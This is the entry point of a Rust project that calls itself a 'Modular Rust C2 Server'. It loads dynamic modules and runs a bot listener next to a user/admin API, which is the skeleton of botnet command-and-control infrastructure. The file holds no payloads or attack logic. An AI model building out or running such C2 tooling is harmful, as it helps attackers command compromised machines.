// src/main.rs

mod core;
mod apis;
mod modules;
mod communicating;

use anyhow::Result;
use std::sync::Arc;

#[tokio::main]
async fn main() -> Result<()> {
    println!("Starting Modular Rust C2 Server...");

    // Initialize shared state
    let server_state = Arc::new(core::state::ServerState::new());

    // Load dynamic modules
    modules::loader::load_modules(&server_state).await?;

    // Start communication handler (bots)
    let comms_handle = communicating::handler::start_bot_listener(server_state.clone());

    // Start API server (users/admins)
    let api_handle = apis::server::start_api_server(server_state.clone());

    // Run both servers concurrently
    tokio::try_join!(comms_handle, api_handle)?;

    Ok(())
}
